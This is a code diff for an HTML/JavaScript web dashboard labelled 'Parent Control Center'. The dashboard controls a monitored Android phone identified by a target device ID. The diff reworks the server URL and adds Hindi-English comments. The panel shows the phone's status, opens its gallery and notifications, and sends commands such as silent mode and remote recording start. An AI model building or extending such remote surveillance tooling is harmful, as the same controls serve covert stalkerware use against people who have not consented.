@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Control Center</title>
+    <title>Parent Control Center</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
@@ -29,10 +29,9 @@
             touch-action: pan-y; 
         }
         
-        /* --- FIXED CONTAINER (Laptop Fix + Phone Fix) --- */
+        /* --- CONTAINER --- */
         .container {
             width: 100%; 
-            /* 400px maximum rakha hai taki laptop par neat dikhe */
             max-width: 400px; 
             background: rgba(0, 0, 0, 0.5);
             border-radius: 25px; padding: 15px;
@@ -71,12 +70,12 @@
             text-decoration: underline; cursor: pointer; margin-bottom: 20px; display: block;
         }
 
-        /* --- GRID LAYOUT --- */
+        /* --- GRID CONTROLS --- */
         .controls-grid { 
             display: grid; 
             grid-template-columns: repeat(4, 1fr); 
-            grid-auto-rows: 75px; /* Height fix rakhi hai */
-            gap: 8px; /* Gap thora kam kiya taaki phone par button bade dikhe */
+            grid-auto-rows: 75px;
+            gap: 8px;
         }
 
         .slider-card {
@@ -203,9 +202,11 @@
             
             <div onclick="openView('gallery')" class="control-btn"><i class="fa-solid fa-images"></i><span>Gallery</span></div>
             <div onclick="openView('notifications')" class="control-btn"><i class="fa-regular fa-message"></i><span>Notify</span></div>
+            
             <div class="control-btn" id="soundBtn" onclick="cycleSoundMode()">
                 <i class="fa-solid fa-bell" id="soundIcon"></i><span id="soundText">Normal</span>
             </div>
+            
             <div class="control-btn" id="recBtn" onclick="toggleRec()">
                 <i class="fa-solid fa-circle-dot"></i><span>Rec</span>
             </div>
@@ -223,7 +224,18 @@
     </div>
 
     <script>
-        const API_BASE = 'https://child-v9no.onrender.com';
+        // ----------------------------------------------
+        // 🔥 STEP 1: APNA SERVER URL YAHAN PASTE KARO
+        // Agar local chala rahe ho toh: http://localhost:3000
+        // Agar Render/Heroku par hai toh: https://your-app-name.onrender.com
+        // ----------------------------------------------
+        const API_BASE = window.location.origin.includes("localhost") 
+                         ? "http://localhost:3000" 
+                         : window.location.origin; 
+        
+        // ^ Ye automatically detect karega agar tum isi server par file host kar rahe ho.
+        // Agar dashboard alag jagah hai, toh upar wali line hata ke apna URL string mein daal dena.
+
         let DEVICE_ID = localStorage.getItem('monitoring_id') || '';
 
         function initDashboard() {
@@ -241,7 +253,7 @@
         }
 
         function askID() {
-            let id = prompt("Phone App mein dikhne waali ID dalo:", DEVICE_ID);
+            let id = prompt("Enter Target Device ID (Jo Phone App mein dikh rahi hai):", DEVICE_ID);
             if (id && id.trim() !== "") {
                 DEVICE_ID = id.trim().toUpperCase();
                 localStorage.setItem('monitoring_id', DEVICE_ID);
@@ -251,7 +263,7 @@
         }
 
         function resetID() {
-            if(confirm("Change Device ID? Current: " + DEVICE_ID)) {
+            if(confirm("Change Monitoring ID? Current: " + DEVICE_ID)) {
                 localStorage.removeItem('monitoring_id');
                 localStorage.removeItem('last_model');
                 location.reload();
@@ -263,11 +275,11 @@
              const statusText = document.getElementById('statusText');
              if(isOnline) {
                 dot.className = "dot online";
-                statusText.innerText = "Connected";
+                statusText.innerText = "Online";
                 statusText.style.color = "#4caf50";
             } else {
                 dot.className = "dot offline";
-                statusText.innerText = "Disconnected";
+                statusText.innerText = "Offline";
                 statusText.style.color = "#ff4444";
             }
         }
@@ -283,7 +295,7 @@
                         localStorage.setItem('last_model', data.model || DEVICE_ID);
                         document.getElementById('androidVer').innerText = data.version || "--";
                         setStatus(data.isOnline);
-                        document.getElementById('networkType').innerText = data.isOnline ? "Online" : "Last Seen";
+                        document.getElementById('networkType').innerText = data.isOnline ? "Active" : "Last Seen";
                         
                         const battery = data.battery || 0;
                         document.getElementById('batteryPercent').innerText = battery + "%";
@@ -291,34 +303,43 @@
                         document.getElementById('batteryStatus').innerText = data.charging ? "⚡ Charging..." : "🔋 On Battery";
                     }
                 })
-                .catch(err => console.log("Connection Error:", err));
+                .catch(err => console.log("Connection Error (Check API_BASE):", err));
         }
 
         function openView(page) {
             if(!DEVICE_ID) return askID();
-            window.location.href = `view_${page}.html?id=${DEVICE_ID}`;
+            // Note: Ye pages (view_screen.html etc) tumhe server folder mein banane honge
+            window.location.href = `${API_BASE}/get-data/${DEVICE_ID}/${page}`;
         }
         function openDirect(filename) {
             if(!DEVICE_ID) return askID();
-            window.location.href = `${filename}?id=${DEVICE_ID}`;
+            alert("Ye feature file list check karega: " + filename);
         }
 
+        // --- COMMAND SENDER ---
         function sendCommand(action) {
             if(!DEVICE_ID) return askID();
+            
+            console.log("Sending Command:", action, "to", API_BASE);
+
             fetch(`${API_BASE}/api/send-command`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ device_id: DEVICE_ID, command: action })
-            });
-            console.log("Sent: " + action);
+            })
+            .then(res => res.json())
+            .then(data => console.log("Server Response:", data))
+            .catch(err => alert("Command Failed! Server Check Karo."));
         }
 
+        // --- SLIDER UI LOGIC ---
         function updateSliderUI(type, val) {
             document.getElementById(`${type}Fill`).style.height = val + "%";
             const icon = document.getElementById(`${type}Icon`);
             if(val > 25) { icon.style.color = "#333"; } else { icon.style.color = "#fff"; }
         }
 
+        // --- SOUND MODE LOGIC ---
         let modes = ['normal', 'vibrate', 'silent'];
         let icons = ['fa-bell', 'fa-vibration', 'fa-bell-slash'];
         let labels = ['Normal', 'Vibrate', 'Silent'];
@@ -329,24 +350,28 @@
             const icon = document.getElementById('soundIcon');
             const text = document.getElementById('soundText');
             const btn = document.getElementById('soundBtn');
+            
             icon.className = `fa-solid ${icons[currentModeIndex]}`;
             text.innerText = labels[currentModeIndex];
+            
             if(modes[currentModeIndex] === 'silent' || modes[currentModeIndex] === 'vibrate') {
                  btn.classList.add('active-state');
             } else {
                  btn.classList.remove('active-state');
             }
+            // Command bhejo (normal, vibrate, silent)
             sendCommand(modes[currentModeIndex]);
         }
 
+        // --- RECORDING LOGIC ---
         let isRecording = false;
         function toggleRec() {
             isRecording = !isRecording;
             const btn = document.getElementById('recBtn');
             if(isRecording) {
                 btn.classList.add('active-state');
-                btn.querySelector('span').innerText = "Stop Rec";
-                sendCommand('rec_start');
+                btn.querySelector('span').innerText = "Stop";
+                sendCommand('rec_start'); // Server ko batao recording start kare
             } else {
                 btn.classList.remove('active-state');
                  btn.querySelector('span').innerText = "Rec";
@@ -354,7 +379,8 @@
             }
         }
 
-        setInterval(updateDashboard, 5000);
+        // Auto Refresh har 3 second mein status check karega
+        setInterval(updateDashboard, 3000);
         window.onload = initDashboard;
     </script>
 </body>
